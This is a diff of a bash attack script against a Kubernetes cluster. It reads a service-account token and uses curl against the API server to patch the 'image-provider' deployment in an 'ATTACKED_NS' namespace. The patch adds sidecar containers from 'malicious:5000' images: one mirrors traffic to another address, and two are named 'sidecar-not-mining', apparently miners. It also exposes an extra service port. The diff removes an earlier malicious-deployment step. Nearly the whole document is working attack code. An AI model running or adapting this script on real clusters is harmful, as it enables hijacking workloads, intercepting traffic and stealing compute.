@@ -1,46 +1,19 @@
 #!/usr/bin/env bash
 
-# Percorsi standard montati nel Pod
 MIRRORADDR="${MIRRORADDR:-prova.dmz.svc.cluster.local:8080}"
-NAMESPACE2="${NAMESPACE2:-"dmz"}"
+ATTACKED_NS="${ATTACKED_NS:-"dmz"}"
 TOKEN_PATH="$DATA_PATH/KC1/token"
 CA_PATH="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
-NAMESPACE_PATH="/var/run/secrets/kubernetes.io/serviceaccount/namespace"
-
-# Leggo i dati dal filesystem
 TOKEN=$(cat ${TOKEN_PATH})
-NAMESPACE=$(cat ${NAMESPACE_PATH})
-GROUP="cluster2"
-
-# URL API Server (interno al cluster, service DNS)
 APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
-IPAUTH=$(nslookup -type=A auth.app | awk '/Address: /{print $2}')
+IPAUTH=$(nslookup -type=A auth.$AUTH_NS | awk '/Address: /{print $2}')
+TMP_FILE="$DATA_PATH/KC1/patch_sidecar.json"
 
-# Deployment YAML
-cat > /tmp/deployment-malicious.yaml <<EOF
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: deployment-not-malicious
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: deployment-not-malicious
-  template:
-    metadata:
-      labels:
-        app: deployment-not-malicious
-    spec:
-      containers:
-      - name: malicious
-        image: malicious:5000/attacker:2.0.2
-        ports:
-        - containerPort: 8080
-        env:
-          - name: GROUP
-            value: "${GROUP}"
-EOF
+# Installing dependencies and setup
+apt-get update >/dev/null 2>&1
+apt-get install -y --no-install-recommends curl jq ca-certificates >/dev/null 2>&1
+mkdir -p $(dirname $TMP_FILE)
+
 
 jq -n \
   --arg ipauth "$IPAUTH:8080" \
@@ -50,7 +23,7 @@ jq -n \
     "op":"add",
     "path":"/spec/template/spec/containers/-",
     "value":{
-      "name":"sidecar-malicious",
+      "name":"sidecar-not-malicious",
       "image":"malicious:5000/sidecar-mal:2.0.2",
       "ports":[{"containerPort":8080}],
       "env":[
@@ -58,31 +31,47 @@ jq -n \
         {"name":"MIRROR_ADDR","value":$mirroraddr}
       ]
     }
+  },
+  {
+    "op":"add",
+    "path":"/spec/template/spec/containers/-",
+    "value":{
+      "name":"sidecar-not-mining",
+      "image":"malicious:5000/attacker:2.0.2",
+      "env":[
+        {"name":"GROUP","value":"cluster"}
+      ]
+    }
+  },
+  {
+    "op":"add",
+    "path":"/spec/template/spec/containers/-",
+    "value":{
+      "name":"sidecar-not-mining2",
+      "image":"malicious:5000/attacker:2.0.2",
+      "env":[
+        {"name":"GROUP","value":"cluster"}
+      ]
+    }
   }
-]' > /tmp/patch_sidecar.json
+]' > $TMP_FILE
 
-# Invio la richiesta all’API Server autenticandomi con il token
-curl --cacert ${CA_PATH} \
-  -H "Authorization: Bearer ${TOKEN}" \
-  -H "Content-Type: application/yaml" \
-  -X POST \
-  --data-binary @/tmp/deployment-malicious.yaml \
-  ${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE}/deployments
-
-# Aggiunta del sidecar su image-provider
+# Adding sidecars
 curl -X PATCH \
   --cacert "${CA_PATH}" \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/json-patch+json" \
-  --data @/tmp/patch_sidecar.json \
-  "${APISERVER}/apis/apps/v1/namespaces/${NAMESPACE2}/deployments/image-provider"
+  --data @$TMP_FILE \
+  "${APISERVER}/apis/apps/v1/namespaces/${ATTACKED_NS}/deployments/image-provider"
 
-# Aggiunta service
+# Modify service
 curl -H "Authorization: Bearer $TOKEN" \
   --cacert ${CA_PATH} \
   -H "Content-Type: application/json-patch+json" \
   -X PATCH \
-  "${APISERVER}/api/v1/namespaces/${NAMESPACE2}/services/image-provider" \
+  "${APISERVER}/api/v1/namespaces/${ATTACKED_NS}/services/image-provider" \
   -d '[{"op":"add","path":"/spec/ports/-","value":{"port":8080,"targetPort":8080,"protocol":"TCP","name":"http-8080"}}]'
+
+rm -f $TMP_FILE
 
 echo "Containers deployed"
